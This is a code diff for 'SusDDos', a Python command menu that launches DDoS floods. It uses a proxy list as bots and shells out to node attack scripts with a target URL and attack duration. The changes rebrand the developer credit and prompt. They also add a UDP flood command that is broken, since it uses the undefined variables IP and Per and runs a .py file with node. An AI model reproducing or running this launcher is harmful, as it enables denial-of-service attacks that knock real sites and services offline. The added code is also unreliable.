@@ -61,7 +61,7 @@ proxys = open('proxies.txt').readlines()
 bots = len(proxys)
 
 def si():
-    print('\x1b[38;2;255;20;147mWelcome to SusDDos \x1b[38;2;233;233;233mBy DK')
+    print('\x1b[38;2;255;20;147mWelcome to SusDDos \x1b[38;2;233;233;233mBy DucDuy')
     print("")
 
 def special():
@@ -100,7 +100,7 @@ def title():
                 \x1b[38;2;0;255;255m          \x1b[38;2;0;255;255mType [help] to se\x1b[38;2;255;20;147me the Instructions
                 \x1b[38;2;0;255;255m╚═══════════════╦═════════\x1b[38;2;0;255;255m═\x1b[38;2;255;20;147m═════════╦═══════════════╝
             \x1b[38;2;0;255;255m╔═══════════════════╩══════════\x1b[38;2;255;20;147m═════════╩═══════════════════╗
-            \x1b[38;2;0;255;255m  - - - \x1b[38;2;0;255;255m[ Dev:      DK    ND  ] - - -
+            \x1b[38;2;0;255;255m  - - - \x1b[38;2;0;255;255m[ Dev:      LOVE KIEU ANH  ] - - -
             \x1b[38;2;0;255;255m╚═══════════════════╦══════════\x1b[38;2;255;20;147m═════════╦═══════════════════╝
                 \x1b[38;2;0;255;255m╔═══════════════╩══════════\x1b[38;2;255;20;147m═════════╩═══════════════╗
                 \x1b[38;2;0;255;255m                 \x1b[38;2;0;255;255mPowered by\x1b[38;2;255;20;147m SUS DDoS
@@ -150,7 +150,7 @@ def banners():
 def main():
     title()
     while(True):
-        cnc = input('''\x1b[38;2;0;255;255m[SUSDDoS\x1b[38;2;255;20;147mDK]:''')
+        cnc = input('''\x1b[38;2;0;255;255m[admin\x1b[38;2;255;20;147mSUSDDOS]:''')
         if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
             layer7()
         if cnc == "methods" or cnc == "METHODS" or cnc == "MS" or cnc == "ms":
@@ -249,7 +249,16 @@ def main():
                 os.system(f'node HTTP-MIX {url} {time}')
             except IndexError:
                 print('Usage: http-mix <url> <time>')
-                print('Example: http-mix https://example.com 120')                
+                print('Example: http-mix https://example.com 120')     
+
+        elif "UDP" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node udp.py {IP} {Per} {time}')
+            except IndexError:
+                print('Usage: udp <url> <per> <time>')
+                print('Example: udp 1.1.1.1 1000 120')
         
         else:
             try:
